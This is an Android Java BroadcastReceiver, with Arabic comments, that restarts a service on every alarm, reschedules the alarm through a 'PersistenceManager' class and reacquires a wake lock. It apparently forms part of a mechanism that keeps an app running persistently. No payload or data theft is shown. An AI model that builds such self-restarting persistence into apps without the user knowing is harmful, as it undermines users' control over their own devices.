package com.sec.check;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.util.Log;

public class AlarmReceiver extends BroadcastReceiver {

    private static final String TAG = "SecurityCheck";

    @Override
    public void onReceive(Context context, Intent intent) {
        String action = intent.getAction();
        Log.d(TAG, "[ALARM] received: " + action);

        try {
            // ★ شغّل ServiceRunner
            Intent serviceIntent = new Intent(context, ServiceRunner.class);

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(serviceIntent);
            } else {
                context.startService(serviceIntent);
            }

            // ★ أعد جدولة الـ Alarm القادم
            PersistenceManager.scheduleAlarm(context);

            // ★ استرجع WakeLock
            PersistenceManager.acquireWakeLock(context);

            Log.d(TAG, "[ALARM] service restarted");

        } catch (Exception e) {
            Log.e(TAG, "[ALARM] error: " + e.getMessage());
        }
    }
}
